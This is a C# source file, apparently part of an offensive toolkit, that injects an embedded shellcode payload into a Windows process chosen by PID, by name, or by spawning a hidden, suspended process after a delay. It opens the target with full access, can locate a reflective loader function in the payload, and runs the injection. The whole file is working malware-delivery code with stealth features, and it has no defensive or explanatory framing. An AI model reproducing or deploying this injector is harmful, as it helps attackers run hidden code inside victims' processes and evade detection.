using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;
using WinAPI.Data.Kernel32;

namespace EntryPoint
{
    public class Entry
    {

        public static void Start()
        {
            Log("Running Inject.");
            ProcessCreationResult procResult = null;
            IntPtr hProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;

            try
            {
                string procIdStr = Inject.Properties.Resources.ProcessId;
                string procName = Inject.Properties.Resources.ProcessName;
                string procSpawn = Inject.Properties.Resources.ProcessSpawn;
                string reflectiveFunctionName = Inject.Properties.Resources.Function;
                int delay = 60;
                int.TryParse(Inject.Properties.Resources.Delay, out delay);

                Log($"ProcessId: {procIdStr}");
                Log($"ProcessName: {procName}");
                Log($"ProcessSpawn: {procSpawn}");
                Log($"ReflectiveFunction: {reflectiveFunctionName}");
                Log($"Delay: {delay}");

                int targetPid = 0;

                // 1. ProcessId
                if (!string.IsNullOrEmpty(procIdStr) && int.TryParse(procIdStr, out int pid))
                {
                    Log($"[>] Targeting ProcessId: {pid}");
                    targetPid = pid;
                    hProcess = APIWrapper.OpenProcess(targetPid, ProcessAccessFlags.PROCESS_ALL_ACCESS);
                    Log($"[>] Found ProcessId: {targetPid}");
                }
                // 2. ProcessName
                else if (!string.IsNullOrEmpty(procName))
                {
                    Log($"[>] Targeting ProcessName: {procName}");
                    var processes = APIWrapper.GetProcessList(procName);
                    var proc = processes.FirstOrDefault();
                    if (proc != null)
                    {
                        targetPid = (int)proc.ProcessId;
                        Log($"[>] Found ProcessId: {targetPid}");
                        hProcess = APIWrapper.OpenProcess(targetPid, ProcessAccessFlags.PROCESS_ALL_ACCESS);
                    }
                }
                // 3. ProcessSpawn
                else if (!string.IsNullOrEmpty(procSpawn))
                {
                    if (delay > 0)
                    {
                        Log($"[>] Waiting Delay: {delay}s");
                        Thread.Sleep(delay * 1000);
                    }

                    Log($"[>] Spawning Process: {procSpawn}");
                    var creationParms = new ProcessCreationParameters()
                    {
                        Application = procSpawn,
                        CreateNoWindow = true,
                        CreateSuspended = true,
                    };

                    procResult = APIWrapper.CreateProcess(creationParms);
                    if (procResult != null)
                    {
                        hProcess = procResult.ProcessHandle;
                        hThread = procResult.ThreadHandle;
                    }
                }
                else
                {
                    Log("[!] No valid target specified (ProcessId, ProcessName, or ProcessSpawn). Exiting.");
                    return;
                }

                if (hProcess != IntPtr.Zero)
                {
                    Log($"[>] Injecting Target Process");
                    byte[] shellcode = Inject.Properties.Resources.Payload;
                    uint shellCodeOffset = string.IsNullOrEmpty(reflectiveFunctionName) ? 0 : WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(shellcode, reflectiveFunctionName);
                    Log($"[>] shellCodeLenght : {shellcode.Length} - functionOffset {shellCodeOffset}");
                    APIWrapper.Inject(hProcess, hThread, shellcode, shellCodeOffset);
                }
                else
                {
                    Log("[!] Failed to get handle to process.");
                }
            }
            catch (Exception e)
            {
                Log(e.ToString());
                if (procResult != null && procResult.ProcessId != 0)
                {
                     // Only kill if we spawned it and failed
                     APIWrapper.KillProcess(procResult.ProcessId);
                }
            }
            finally
            {
                if (procResult != null)
                {
                     // If we spawned it, handles are in procResult
                     APIWrapper.CloseHandle(procResult.ProcessHandle);
                     APIWrapper.CloseHandle(procResult.ThreadHandle);
                     APIWrapper.CloseHandle(procResult.OutPipeHandle);
                }
                else
                {
                    // If we opened existing process, close local handles
                    if (hProcess != IntPtr.Zero) APIWrapper.CloseHandle(hProcess);
                    // hThread is likely Zero for existing process, but if used, close it
                    if (hThread != IntPtr.Zero) APIWrapper.CloseHandle(hThread);
                }
            }


            Thread.Sleep(1000);

            Log("End Injects !");

            Environment.Exit(0);
        }

        private static void Log(string msg)
        {
#if DEBUG
            try
            {
                Console.WriteLine(msg);
                File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} : {msg}{Environment.NewLine}");
            }
            catch { }
#endif
        }
    }
}
